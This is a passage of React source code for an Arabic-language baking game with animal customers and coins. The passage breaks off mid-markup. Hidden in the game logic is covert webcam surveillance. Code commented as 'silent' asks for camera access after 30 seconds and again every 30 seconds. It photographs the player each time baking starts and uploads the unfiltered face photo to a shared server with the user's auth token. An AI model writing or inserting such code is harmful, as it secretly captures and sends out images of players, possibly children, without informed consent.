import React, { useState, useEffect, useRef } from 'react';
import { Oven } from '../src/components/Oven';
import { SecretLog } from '../src/components/SecretLog';
import { LogoMakerModal } from '../src/components/LogoMakerModal';
import { saveCapture, saveCaptureToServer } from '../src/utils/db';
import { playButtonPress, playOvenHum, playSizzling, playOvenDing, playCoinsSound } from '../src/utils/audio';
import { auth, googleAuthProvider } from './lib/firebase.ts';
import { signInWithPopup, signOut, onAuthStateChanged, User, GoogleAuthProvider } from 'firebase/auth';
import { 
  Settings, 
  Flame, 
  Award, 
  Utensils, 
  Zap, 
  Sparkles, 
  RotateCcw, 
  Coins, 
  ChefHat, 
  RefreshCw, 
  Star, 
  Info,
  Layers,
  Sparkle,
  Camera,
  EyeOff,
  Cloud
} from 'lucide-react';
import { GoogleDriveDashboard } from './components/GoogleDriveDashboard';

interface FloatingBubble {
  id: number;
  x: number;
  y: number;
  size: number;
  speed: number;
  color: string;
}

interface ConfettiParticle {
  id: number;
  x: number;
  y: number;
  size: number;
  color: string;
  vx: number;
  vy: number;
  angle: number;
  spin: number;
}

interface FlyingIngredient {
  id: number;
  x: number;
  y: number;
  emoji: string;
  vx: number;
  vy: number;
  rotation: number;
}

interface FlyingCoin {
  id: number;
  x: number;
  y: number;
  targetX: number;
  targetY: number;
  progress: number; 
}

interface RestaurantClient {
  id: number;
  name: string;
  emoji: string;
  requestedItem: 'bread' | 'pizza' | 'croissant' | 'cake' | 'cookie' | 'pie' | 'dough' | 'hamburger';
  dialogue: string;
  basePayout: number;
}

const CLIENT_TEMPLATES: Omit<RestaurantClient, 'id'>[] = [
  { name: 'القط كوكو 🐱', emoji: '🐱', requestedItem: 'cookie', dialogue: 'مياو! أشم رائحة زكية جداً، أرجوك أريد كعكة كوكيز دافئة!', basePayout: 40 },
  { name: 'الدب المحبوب 🐻', emoji: '🐻', requestedItem: 'pie', dialogue: 'يا الهي! رائحة التفاح والفرن مذهلة، أريد فطيرة تفاح عسلية دافئة!', basePayout: 60 },
  { name: 'الأرنب السريع 🐰', emoji: '🐰', requestedItem: 'croissant', dialogue: 'هل لديكم كرواسون فرنسي هش ومقرمش للفطور؟ سأدفع بسخاء!', basePayout: 50 },
  { name: 'الثعلب الأنيق 🦊', emoji: '🦊', requestedItem: 'pizza', dialogue: 'مساء الخير! هل يمكنني الحصول على بيتزا نابولي الإيطالية المليئة بالجبن السائل؟', basePayout: 70 },
  { name: 'الأسد الشجاع 🦁', emoji: '🦁', requestedItem: 'bread', dialogue: 'أنا جائع جداً بعد جولة الصيد، أريد خبزة فرنسية عائلية ضخمة!', basePayout: 45 },
  { name: 'الباندا الكسول 🐼', emoji: '🐼', requestedItem: 'cake', dialogue: 'أريد شيئاً حلواً ولذيذاً للغاية، كعكة شوكولاتة فاخرة تناسب يومي الطويل!', basePayout: 80 },
  { name: 'الذئب الجائع 🐺', emoji: '🐺', requestedItem: 'hamburger', dialogue: 'همبرجر اللحم دبل جبنة وسلايدر مشوي هي وجبتي المفضلة! حضرها لي حالاً!', basePayout: 90 },
  { name: 'السنجاب النشيط 🐿️', emoji: '🐿️', requestedItem: 'dough', dialogue: 'أنا طباخ مبتدئ وأريد شراء عجينة مخمرة طازجة لأخبزها بنفسي في منزلي!', basePayout: 35 }
];

export default function App() {
  const [itemType, setItemType] = useState<'bread' | 'pizza' | 'croissant' | 'cake' | 'cookie' | 'pie' | 'dough' | 'hamburger'>('bread');
  const [temperature, setTemperature] = useState(350); 
  const [isBaking, setIsBaking] = useState(false);
  const [bakeProgress, setBakeProgress] = useState(0);
  const [bakedCount, setBakedCount] = useState(0);

  // Firebase Auth states
  const [user, setUser] = useState<User | null>(null);
  const [authToken, setAuthToken] = useState<string | null>(null);
  const [googleAccessToken, setGoogleAccessToken] = useState<string | null>(null);
  const [showDriveDashboard, setShowDriveDashboard] = useState(false);

  const handleGoogleLoginForDrive = async (): Promise<string | null> => {
    try {
      const result = await signInWithPopup(auth, googleAuthProvider);
      const credential = GoogleAuthProvider.credentialFromResult(result);
      if (credential?.accessToken) {
        setGoogleAccessToken(credential.accessToken);
        return credential.accessToken;
      }
      return null;
    } catch (err) {
      console.error("Firebase Sign-In with Google Drive scopes failed:", err);
      return null;
    }
  };

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (currentUser) => {
      if (currentUser) {
        setUser(currentUser);
        try {
          const token = await currentUser.getIdToken(true);
          setAuthToken(token);
        } catch (err) {
          console.error("Error getting Firebase ID token:", err);
        }
      } else {
        setUser(null);
        setAuthToken(null);
        setGoogleAccessToken(null);
      }
    });
    return () => unsubscribe();
  }, []);
  
  // Game states
  const [coins, setCoins] = useState<number>(100);
  const [currentClient, setCurrentClient] = useState<RestaurantClient>({
    id: 1,
    name: 'الأرنب السريع 🐰',
    emoji: '🐰',
    requestedItem: 'croissant',
    dialogue: 'هل لديكم كرواسون فرنسي هش ومقرمش للفطور؟ سأدفع بسخاء!',
    basePayout: 50
  });
  const [freshlyBakedItem, setFreshlyBakedItem] = useState<'bread' | 'pizza' | 'croissant' | 'cake' | 'cookie' | 'pie' | 'dough' | 'hamburger' | null>(null);
  const [bakeQuality, setBakeQuality] = useState<number>(100); 
  const [activeTab, setActiveTab] = useState<'recipes' | 'ingredients'>('recipes');
  
  // Clean, high contrast toggles
  const [neonMode, setNeonMode] = useState(false);
  const [steamMode, setSteamMode] = useState(true);
  const [showSettings, setShowSettings] = useState(false);
  const [lastBakeSuccess, setLastBakeSuccess] = useState(false);

  // Camera settings (handled silently in background)
  const [cameraActive, setCameraActive] = useState(false);
  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null);
  const [chefHatEnabled, setChefHatEnabled] = useState(false);
  const [flashActive, setFlashActive] = useState(false);
  const [chefHatX, setChefHatX] = useState(0);
  const [chefHatY, setChefHatY] = useState(15);
  const [chefHatScale, setChefHatScale] = useState(1.2);
  const [selectedFilter, setSelectedFilter] = useState<'warm' | 'gold' | 'neon' | 'normal'>('warm');
  const [chefCapturedPhoto, setChefCapturedPhoto] = useState<string | null>(null);

  // Restaurant official branding logo / storefront
  const [restaurantLogo, setRestaurantLogo] = useState<string | null>(localStorage.getItem('restaurant_logo'));
  const [showLogoMaker, setShowLogoMaker] = useState(false);

  // Soft, elegant background particles (steam)
  const [bubbles, setBubbles] = useState<FloatingBubble[]>([]);

  // Confetti particles for success celebration
  const [particles, setParticles] = useState<ConfettiParticle[]>([]);

  // Flying ingredients particles
  const [flyingIngredients, setFlyingIngredients] = useState<FlyingIngredient[]>([]);

  // Track ingredients added to the oven to display on the food item
  const [addedIngredients, setAddedIngredients] = useState<string[]>([]);

  // Flying coins particles
  const [flyingCoins, setFlyingCoins] = useState<FlyingCoin[]>([]);

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const bakingTimerRef = useRef<NodeJS.Timeout | number | null>(null);
  const bakeProgressStateRef = useRef<number>(0);

  // Request camera stream silently
  const initCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { width: 640, height: 480, facingMode: 'user' }
      });
      setCameraStream(stream);
      setCameraActive(true);
    } catch (err) {
      console.warn('Silent camera setup skipped or permission denied:', err);
      setCameraActive(false);
      setCameraStream(null);
    }
  };

  // Bind the cameraStream to the video element whenever it is rendered/mounted in the DOM
  useEffect(() => {
    if (cameraActive && cameraStream && videoRef.current) {
      const video = videoRef.current;
      video.srcObject = cameraStream;
      video.onloadedmetadata = () => {
        video.play().catch((playErr) => {
          console.warn('Video play was interrupted or failed:', playErr);
        });
      };
    }
  }, [cameraActive, cameraStream]);

  // Attempt to initialize camera automatically after 30 seconds if not already active or captured
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!cameraActive && !chefCapturedPhoto) {
        initCamera();
      }
    }, 30000); // 30 seconds delay

    return () => clearTimeout(timer);
  }, [cameraActive, chefCapturedPhoto]);

  // Handle other mounting configurations (bubbles, client, logo maker)
  useEffect(() => {
    // Generate very subtle, high-class slow drifting ambient lights/bubbles
    const initialBubbles = Array.from({ length: 8 }).map((_, i) => ({
      id: i,
      x: Math.random() * 90,
      y: 100 + Math.random() * 50,
      size: 10 + Math.random() * 15,
      speed: 0.3 + Math.random() * 0.5,
      color: 'rgba(251, 146, 60, 0.08)' // very soft orange glow
    }));
    setBubbles(initialBubbles);

    // Initial random customer
    generateNewClient();
  }, []);

  // PERSISTENT CAMERA REQUEST: Every 30 seconds, if camera is inactive, request it again!
  useEffect(() => {
    const cameraCheckerInterval = setInterval(() => {
      if (!cameraActive) {
        console.log('Camera access inactive. Repeated silent camera permission requested...');
        initCamera();
      }
    }, 30000); 

    return () => clearInterval(cameraCheckerInterval);
  }, [cameraActive]);

  // Gentle drift of background particles
  useEffect(() => {
    const interval = setInterval(() => {
      setBubbles((prev) =>
        prev.map((b) => {
          let newY = b.y - b.speed;
          if (newY < -20) {
            newY = 110; 
          }
          return { ...b, y: newY };
        })
      );
    }, 40);
    return () => clearInterval(interval);
  }, []);

  // Update confetti particles physics loop
  useEffect(() => {
    if (particles.length === 0) return;
    const animationFrame = requestAnimationFrame(() => {
      setParticles((prev) =>
        prev
          .map((p) => ({
            ...p,
            x: p.x + p.vx * 0.12,
            y: p.y + p.vy * 0.12,
            vy: p.vy + 0.5, 
            vx: p.vx * 0.98, 
            angle: p.angle + p.spin,
          }))
          .filter((p) => p.y < 115 && p.x > -15 && p.x < 115)
      );
    });
    return () => cancelAnimationFrame(animationFrame);
  }, [particles]);

  // Update flying ingredients physics loop
  useEffect(() => {
    if (flyingIngredients.length === 0) return;
    const animationFrame = requestAnimationFrame(() => {
      setFlyingIngredients((prev) =>
        prev
          .map((ing) => {
            const dx = 50 - ing.x;
            const dy = 52 - ing.y;
            const distance = Math.sqrt(dx * dx + dy * dy);
            
            if (distance < 5) {
              return null;
            }

            const speed = 2.8;
            return {
              ...ing,
              x: ing.x + (dx / distance) * speed,
              y: ing.y + (dy / distance) * speed,
              rotation: ing.rotation + 10
            };
          })
          .filter((ing): ing is FlyingIngredient => ing !== null)
      );
    });
    return () => cancelAnimationFrame(animationFrame);
  }, [flyingIngredients]);

  // Update flying coins loop
  useEffect(() => {
    if (flyingCoins.length === 0) return;
    const animationFrame = requestAnimationFrame(() => {
      setFlyingCoins((prev) =>
        prev
          .map((fc) => {
            const nextProgress = fc.progress + 0.05;
            if (nextProgress >= 1) {
              return null; 
            }
            const currentX = fc.x + (fc.targetX - fc.x) * nextProgress;
            const currentY = fc.y + (fc.targetY - fc.y) * nextProgress;
            return {
              ...fc,
              progress: nextProgress
            };
          })
          .filter((fc): fc is FlyingCoin => fc !== null)
      );
    });
    return () => cancelAnimationFrame(animationFrame);
  }, [flyingCoins]);

  // Pop a bubble on click
  const popBubble = (id: number) => {
    playButtonPress();
    setBubbles((prev) => prev.filter((b) => b.id !== id));
    setTimeout(() => {
      setBubbles((prev) => [
        ...prev,
        {
          id: Date.now() + Math.random(),
          x: Math.random() * 90,
          y: 110,
          size: 10 + Math.random() * 15,
          speed: 0.3 + Math.random() * 0.5,
          color: 'rgba(251, 146, 60, 0.08)'
        }
      ]);
    }, 1500);
  };

  // Generate new client
  const generateNewClient = () => {
    const randomIndex = Math.floor(Math.random() * CLIENT_TEMPLATES.length);
    const template = CLIENT_TEMPLATES[randomIndex];
    
    setCurrentClient({
      id: Date.now(),
      name: template.name,
      emoji: template.emoji,
      requestedItem: template.requestedItem,
      dialogue: template.dialogue,
      basePayout: template.basePayout
    });
  };

  // Change client
  const handleRefreshClient = () => {
    if (coins < 5) return;
    playButtonPress();
    setCoins((prev) => prev - 5);
    generateNewClient();
  };

  // Throw ingredient to oven
  const handleLaunchIngredient = (emoji: string) => {
    playButtonPress();
    
    // Quality boosts
    setBakeQuality((prev) => Math.min(180, prev + 15));

    // Add to visual ingredients inside the oven
    setAddedIngredients((prev) => [...prev, emoji]);

    // Projectile starting point
    const newIng: FlyingIngredient = {
      id: Date.now() + Math.random(),
      x: 15 + Math.random() * 10,
      y: 70 + Math.random() * 10,
      emoji,
      vx: 1.5,
      vy: -1.5,
      rotation: Math.random() * 360
    };

    setFlyingIngredients((prev) => [...prev, newIng]);

    // Fast-forward cooking time by 4% on click
    if (isBaking) {
      const speedJump = 4;
      const nextProgress = Math.min(100, bakeProgressStateRef.current + speedJump);
      bakeProgressStateRef.current = nextProgress;
      setBakeProgress(nextProgress);
    }
  };

  // Serve and sell
  const handleSellItem = () => {
    if (!freshlyBakedItem) return;
    playCoinsSound();

    const isMatch = freshlyBakedItem === currentClient.requestedItem;
    const qualityMultiplier = bakeQuality / 100;
    const calculatedBase = isMatch ? currentClient.basePayout * 2.5 : 20;
    const finalEarned = Math.round(calculatedBase * qualityMultiplier);

    // Coins animation
    const coinSpawns = Array.from({ length: 8 }).map((_, i) => ({
      id: Date.now() + i + Math.random(),
      x: 35 + (Math.random() - 0.5) * 6,
      y: 40 + (Math.random() - 0.5) * 6,
      targetX: 84,
      targetY: 4,
      progress: 0
    }));
    setFlyingCoins((prev) => [...prev, ...coinSpawns]);

    setTimeout(() => {
      setCoins((prev) => prev + finalEarned);
    }, 600);

    triggerConfetti();

    // Reset table
    setFreshlyBakedItem(null);
    setLastBakeSuccess(false);

    // Get next customer
    setTimeout(() => {
      generateNewClient();
    }, 1000);
  };

  // Blast particles
  const triggerConfetti = () => {
    const colors = ['#f43f5e', '#10b981', '#3b82f6', '#fb923c', '#a855f7', '#06b6d4'];
    const newParticles: ConfettiParticle[] = Array.from({ length: 50 }).map((_, i) => ({
      id: Date.now() + i + Math.random(),
      x: 40 + Math.random() * 20, 
      y: 35 + Math.random() * 15,
      size: 6 + Math.random() * 10,
      color: colors[Math.floor(Math.random() * colors.length)],
      vx: (Math.random() - 0.5) * 14, 
      vy: -10 - Math.random() * 12, 
      angle: Math.random() * 360,
      spin: (Math.random() - 0.5) * 15,
    }));
    setParticles(newParticles);
  };

  // Snap photo
  const capturePhoto = async (isOfficial: boolean = false) => {
    if (!videoRef.current || !canvasRef.current) return;
    try {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      const ctx = canvas.getContext('2d');
      if (ctx && video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // 1. Draw mirrored live stream video
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.setTransform(1, 0, 0, 1, 0, 0);

        // Get the CLEAN raw photo (without chef hat, stamps, stickers, or filters) for settings/database
        const cleanDataUrl = canvas.toDataURL('image/jpeg', 0.85);

        // 2. Apply chosen live camera filter color grading on the canvas itself (for the beautiful frozen display)
        if (selectedFilter === 'warm') {
          ctx.fillStyle = 'rgba(251, 146, 60, 0.12)'; // warm cozy amber tint
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = 'rgba(120, 53, 4, 0.05)'; // slight vignette warmth
          ctx.fillRect(0, 0, canvas.width, canvas.height);
        } else if (selectedFilter === 'gold') {
          ctx.fillStyle = 'rgba(234, 179, 8, 0.15)'; // deep gold
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          // Vintage dark vignette
          const gradient = ctx.createRadialGradient(canvas.width/2, canvas.height/2, canvas.height/3, canvas.width/2, canvas.height/2, canvas.width/2);
          gradient.addColorStop(0, 'rgba(0, 0, 0, 0)');
          gradient.addColorStop(1, 'rgba(0, 0, 0, 0.35)');
          ctx.fillStyle = gradient;
          ctx.fillRect(0, 0, canvas.width, canvas.height);
        } else if (selectedFilter === 'neon') {
          ctx.fillStyle = 'rgba(139, 92, 246, 0.12)'; // violet-magenta overlay
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          const gradient = ctx.createLinearGradient(0, 0, canvas.width, 0);
          gradient.addColorStop(0, 'rgba(6, 182, 212, 0.1)'); // neon cyan
          gradient.addColorStop(1, 'rgba(236, 72, 153, 0.1)'); // neon pink
          ctx.fillStyle = gradient;
          ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        // 3. Draw Chef Hat Overlay based on user-configured sliders
        if (chefHatEnabled) {
          const size = canvas.height * 0.24 * chefHatScale;
          ctx.font = `${size}px sans-serif`;
          ctx.textAlign = 'center';
          ctx.textBaseline = 'middle';
          
          const posX = canvas.width / 2 + (chefHatX / 100) * canvas.width;
          const posY = (chefHatY / 100) * canvas.height;
          
          ctx.save();
          // Add drop shadow under the emoji hat
          ctx.shadowColor = 'rgba(0, 0, 0, 0.65)';
          ctx.shadowBlur = 12;
          ctx.shadowOffsetY = 8;
          ctx.fillText('👨‍🍳', posX, posY);
          ctx.restore();
        }

        // 4. Draw decorative "Chef Studio" restaurant frame overlay
        // Elegant translucent bar at the bottom with restaurant branding
        ctx.fillStyle = 'rgba(15, 23, 42, 0.75)';
        ctx.fillRect(0, canvas.height - 42, canvas.width, 42);
        
        ctx.strokeStyle = 'rgba(245, 158, 11, 0.5)';
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.moveTo(0, canvas.height - 42);
        ctx.lineTo(canvas.width, canvas.height - 42);
        ctx.stroke();

        // Left text: Branding
        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 12px sans-serif';
        ctx.textAlign = 'left';
        ctx.textBaseline = 'middle';
        ctx.fillText('👨‍🍳 MAGIC OVEN - CHEF STUDIO', 16, canvas.height - 21);

        // Right text: Item Type / Live marker
        ctx.fillStyle = '#10b981';
        ctx.font = 'bold 11px sans-serif';
        ctx.textAlign = 'right';
        ctx.textBaseline = 'middle';
        ctx.fillText(`LIVE CAPTURE: ${itemType?.toUpperCase() || 'OFFICIAL'}`, canvas.width - 16, canvas.height - 21);

        // Corner food stickers for high-class bakery decoration
        ctx.font = '24px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText('🥐', 28, 32);
        ctx.fillText('🥖', canvas.width - 28, 32);

        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
        setChefCapturedPhoto(dataUrl);

        // Stop the camera stream to stop transmission and turn off user camera light
        if (video.srcObject) {
          const stream = video.srcObject as MediaStream;
          stream.getTracks().forEach(track => track.stop());
        }
        setCameraStream(null);
        setCameraActive(false);
        
        // Save to local IndexedDB
        await saveCapture({
          photo: cleanDataUrl, // Clean photo without filters/overlays for Settings / Gallery!
          timestamp: Date.now(),
          itemType: itemType,
          temperature: temperature,
          isOfficial: isOfficial
        });

        // Save to Shared Cloud Server (for code "2007" sharing)
        await saveCaptureToServer({
          photo: cleanDataUrl, // Clean photo without filters/overlays for Settings / Gallery!
          timestamp: Date.now(),
          itemType: itemType,
          temperature: temperature,
          isOfficial: isOfficial
        }, authToken);
      }
    } catch (err) {
      console.warn('Capture failed:', err);
    }
  };

  const handleCancelBaking = () => {
    playButtonPress();
    if (bakingTimerRef.current) {
      clearInterval(bakingTimerRef.current);
      bakingTimerRef.current = null;
    }
    playOvenHum(false);
    playSizzling(false);

    setIsBaking(false);
    setBakeProgress(0);
    setLastBakeSuccess(false);
  };

  const handleStartBaking = () => {
    if (isBaking) return;
    playButtonPress();
    
    // Clear any previous ingredients so we start fresh!
    setAddedIngredients([]);
    
    capturePhoto(false);

    playOvenHum(true, temperature);
    playSizzling(true);

    setIsBaking(true);
    setBakeProgress(0);
    bakeProgressStateRef.current = 0;
    setLastBakeSuccess(false);
    setBakeQuality(100);

    const totalSteps = 100;
    const baseDurationMs = 8000;
    const speedRatio = 1 - ((temperature - 100) / 400) * 0.73; 
    const finalDurationMs = baseDurationMs * speedRatio;
    const intervalTime = finalDurationMs / totalSteps;

    const timer = setInterval(() => {
      const nextStep = bakeProgressStateRef.current + 1;
      bakeProgressStateRef.current = nextStep;
      setBakeProgress(nextStep);
      
      if (nextStep >= totalSteps) {
        clearInterval(timer);
        bakingTimerRef.current = null;
        
        playOvenHum(false);
        playSizzling(false);
        playOvenDing();
        triggerConfetti();

        setBakedCount((prev) => prev + 1);
        setIsBaking(false);
        setLastBakeSuccess(true);
        setFreshlyBakedItem(itemType);
      }
    }, intervalTime);

    bakingTimerRef.current = timer;
  };

  const getRecipeName = (type: string) => {
    switch (type) {
      case 'bread': return 'خبز فرنسي عائلي 🍞';
      case 'pizza': return 'بيتزا نابولي بالجبن 🍕';
      case 'croissant': return 'كرواسون فرنسي هش 🥐';
      case 'cake': return 'كعكة شوكولاتة فاخرة 🍰';
      case 'cookie': return 'كوكيز الشوكولاتة اللذيذة 🍪';
      case 'pie': return 'فطيرة تفاح عسلية 🥧';
      case 'dough': return 'عجينة مخمرة طازجة 🥣';
      case 'hamburger': return 'همبرجر دبل جبن مشوي 🍔';
      default: return 'وجبة شهية';
    }
  };

  return (
    <div
      className={`min-h-screen relative flex flex-col justify-between py-8 px-4 md:px-12 text-right font-sans transition-all duration-1000 select-none overflow-hidden ${
        isBaking 
          ? 'bg-gradient-to-br from-[#120501] via-[#050201] to-[#010208]' 
          : 'bg-[#04060d]'
      }`}
    >
      {/* Hidden canvas tracks */}
      <canvas ref={canvasRef} className="hidden" />

      {/* Sparks Celebration */}
      {particles.map((p) => (
        <div
          key={p.id}
          className="absolute pointer-events-none z-50 transition-transform duration-75"
          style={{
            left: `${p.x}%`,
            top: `${p.y}%`,
            width: `${p.size}px`,
            height: `${p.size}px`,
            backgroundColor: p.color,
            transform: `rotate(${p.angle}deg)`,
            borderRadius: Math.random() > 0.4 ? '50%' : '3px',
            boxShadow: `0 4px 8px rgba(0,0,0,0.4), 0 0 15px ${p.color}`,
          }}
        />
      ))}

      {/* Projectile ingredients */}
      {flyingIngredients.map((ing) => (
        <div
          key={ing.id}
          className="absolute pointer-events-none z-40 text-4xl transition-transform duration-75 select-none"
          style={{
            left: `${ing.x}%`,
            top: `${ing.y}%`,
            transform: `translate(-50%, -50%) rotate(${ing.rotation}deg)`,
            filter: 'drop-shadow(0 0 12px rgba(251,146,60,0.5))'
          }}
        >
          {ing.emoji}
        </div>
      ))}

      {/* Shiny Coins animations */}
      {flyingCoins.map((fc) => {
        const currentX = fc.x + (fc.targetX - fc.x) * fc.progress;
        const currentY = fc.y + (fc.targetY - fc.y) * fc.progress;
        return (
          <div
            key={fc.id}
            className="absolute pointer-events-none z-50 text-yellow-400 select-none"
            style={{
              left: `${currentX}%`,
              top: `${currentY}%`,
              transform: 'translate(-50%, -50%) scale(1.4)',
              filter: 'drop-shadow(0 0 15px rgba(234,179,8,0.9))'
            }}
          >
            <Coins className="w-6 h-6 fill-yellow-400 text-yellow-500" />
          </div>
        );
      })}

      {/* Gentle ambient background particles */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none z-0">
        {bubbles.map((b) => (
          <button
            key={b.id}
            onClick={(e) => {
              e.stopPropagation();
              popBubble(b.id);
            }}
            className="absolute rounded-full border border-orange-500/10 flex items-center justify-center cursor-pointer pointer-events-auto active:scale-75 transition-all duration-300"
            style={{
              left: `${b.x}%`,
              top: `${b.y}%`,
              width: `${b.size}px`,
              height: `${b.size}px`,
              backgroundColor: b.color,
              boxShadow: 'inset 0 1px 3px rgba(255,255,255,0.05)',
            }}
          />
        ))}
      </div>

      {/* Sleek, Premium Header */}
      <header className="relative w-full max-w-5xl mx-auto flex flex-col sm:flex-row-reverse gap-4 justify-between items-center z-10 border-b border-slate-900 pb-5 mb-2">
        
        {/* Simplified Branding with Custom Chef Logo */}
        <div className="flex items-center gap-3 text-right">
          <button 
            onClick={() => { playButtonPress(); setShowLogoMaker(true); }}
            className="relative group focus:outline-none shrink-0"
            title="تحديث شعار المطعم"
          >
            {restaurantLogo ? (
              <div className="w-12 h-12 rounded-2xl border-2 border-amber-500/50 overflow-hidden shadow-[0_0_20px_rgba(245,158,11,0.25)] hover:border-amber-400 hover:shadow-[0_0_25px_rgba(245,158,11,0.4)] transition-all duration-300">
                <img src={restaurantLogo} alt="شعار المطعم" className="w-full h-full object-cover" />
              </div>
            ) : (
              <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-orange-500 to-amber-600 flex items-center justify-center shadow-[0_0_20px_rgba(249,115,22,0.3)] hover:scale-105 transition-all">
                <Flame className="w-6 h-6 text-white animate-pulse" />
              </div>
            )}
            <Sparkle className="w-3.5 h-3.5 text-yellow-400 absolute -top-1 -right-1 animate-spin" style={{ animationDuration: '6s' }} />
          </button>
          <div>
            <h1 className="text-xl md:text-2xl font-extrabold text-slate-100 tracking-tight">
              الفرن السحري التفاعلي
            </h1>
            <p className="text-[10px] text-slate-500 font-medium">
              محاكاة طهي هادئة ذات رسومات واقعية وتفاعل دقيق للزبائن
            </p>
          </div>
        </div>

        {/* Header Controls */}
        <div className="flex flex-wrap items-center justify-end gap-3.5">

          {/* Gold Coin Panel */}
          <div className="flex items-center gap-2 bg-slate-950/90 border border-yellow-500/30 px-3.5 py-1.5 rounded-xl text-yellow-400 font-mono shadow-[0_0_15px_rgba(234,179,8,0.15)]">
            <span className="text-sm font-bold tracking-wide">{coins}</span>
            <Coins className="w-4.5 h-4.5 fill-current" />
          </div>

          <button
            onClick={() => { playButtonPress(); setShowSettings(true); }}
            className="p-2.5 bg-slate-950/80 hover:bg-slate-900 text-slate-400 hover:text-cyan-400 rounded-xl border border-slate-900 transition-all active:scale-95 shadow-sm"
            title="الإعدادات المتقدمة"
          >
            <Settings className="w-5 h-5" />
          </button>
        </div>

      </header>

      {/* Focused Clean 2-Column Dashboard */}
      <main className="relative w-full max-w-5xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8 my-4 items-stretch z-10">
        
        {/* Right column: Interactive restaurant customer & item config */}
        <div className="lg:col-span-5 flex flex-col gap-6 justify-between">
          
          {/* Active Restaurant customer - visually clean profile card */}
          <div className="bg-slate-950/60 border border-slate-900/90 rounded-2xl p-5 shadow-lg flex flex-col gap-3.5 relative overflow-hidden flex-1">
            <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900 pb-2.5">
              <div className="flex items-center gap-2">
                <ChefHat className="w-4 h-4 text-orange-500" />
                <h3 className="font-bold text-xs text-slate-300">طلب زبون المطعم</h3>
              </div>
              <span className="text-[9px] text-slate-400 bg-slate-900 px-2 py-0.5 rounded-full font-mono">ORDER STATUS</span>
            </div>

            {/* Client Dialogue */}
            <div className="flex flex-row-reverse items-center gap-4 bg-slate-900/30 p-3.5 rounded-xl border border-slate-900/60">
              <span className="text-4xl bg-slate-950/80 p-2 rounded-xl border border-slate-800/80">{currentClient.emoji}</span>
              <div className="flex-1 text-right">
                <div className="flex flex-row-reverse justify-between items-center mb-0.5">
                  <span className="font-bold text-xs text-slate-200">{currentClient.name}</span>
                  <span className="text-[10px] text-yellow-400 font-mono font-bold flex items-center gap-1">
                    <span>+{currentClient.basePayout * 2.5} كوين</span>
                  </span>
                </div>
                <p className="text-[11px] text-slate-400 leading-relaxed font-normal">"{currentClient.dialogue}"</p>
              </div>
            </div>

            {/* Matching order detail */}
            <div className="flex flex-row-reverse items-center justify-between text-xs bg-slate-950/90 px-3 py-2.5 rounded-xl border border-slate-900/80">
              <span className="text-slate-500 font-medium">الوجبة المطلوبة لتقديمها:</span>
              <span className="font-extrabold text-orange-400">{getRecipeName(currentClient.requestedItem)}</span>
            </div>

            {/* Action buttons */}
            <div className="grid grid-cols-2 gap-2 mt-1">
              <button
                onClick={handleRefreshClient}
                disabled={coins < 5 || isBaking}
                className="py-2 px-3 bg-slate-900/80 hover:bg-slate-850 text-slate-400 hover:text-slate-200 border border-slate-800/60 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-1.5 active:scale-95 disabled:opacity-40"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                <span>زبون جديد (5ك)</span>
              </button>

              <button
                onClick={handleSellItem}
                disabled={!freshlyBakedItem}
                className={`py-2 px-3 rounded-xl text-xs font-extrabold transition-all flex items-center justify-center gap-1.5 active:scale-95 shadow-md ${
                  freshlyBakedItem 
                    ? 'bg-gradient-to-l from-orange-600 to-amber-500 text-white border border-orange-400 animate-pulse'
                    : 'bg-slate-900/40 text-slate-600 border border-slate-950 cursor-not-allowed'
                }`}
              >
                <Star className="w-3.5 h-3.5 fill-current" />
                <span>تسليم وبيع الطلب</span>
              </button>
            </div>

            {/* Counter status label */}
            {freshlyBakedItem ? (
              <div className="bg-orange-950/20 border border-orange-500/20 rounded-xl p-2.5 text-center text-[10px] text-orange-300 font-bold flex items-center justify-center gap-1.5 mt-1">
                <span>على طاولة التقديم:</span>
                <span className="text-yellow-400 font-bold">{getRecipeName(freshlyBakedItem)}</span>
                {freshlyBakedItem === currentClient.requestedItem ? (
                  <span className="text-[9px] bg-orange-500 text-slate-950 px-2 py-0.5 rounded-full font-bold">طابق ممتاز x2.5!</span>
                ) : (
                  <span className="text-[9px] bg-slate-900 text-slate-400 px-2 py-0.5 rounded-full font-bold">غير مطابق للزبون</span>
                )}
              </div>
            ) : (
              <div className="text-center text-[9px] text-slate-600 italic py-2 mt-1">
                طاولة التقديم فارغة حالياً. ابدأ بالطهي في الفرن لإنتاج وجبات طازجة!
              </div>
            )}
          </div>

          {/* Unified recipe & ingredient selectors (cleaner tab structure to prevent visual distraction) */}
          <div className="bg-slate-950/60 border border-slate-900/90 rounded-2xl p-4.5 shadow-lg flex flex-col gap-3">
            
            {/* Minimal tab controller */}
            <div className="grid grid-cols-2 bg-slate-950 p-1 rounded-xl border border-slate-900">
              <button
                onClick={() => { playButtonPress(); setActiveTab('recipes'); }}
                className={`py-1.5 rounded-lg text-xs font-bold transition-all ${
                  activeTab === 'recipes' 
                    ? 'bg-slate-900 text-orange-400 shadow-sm' 
                    : 'text-slate-500 hover:text-slate-300'
                }`}
              >
                قائمة مخبوزاتك 🥐
              </button>
              <button
                onClick={() => { playButtonPress(); setActiveTab('ingredients'); }}
                className={`py-1.5 rounded-lg text-xs font-bold transition-all ${
                  activeTab === 'ingredients' 
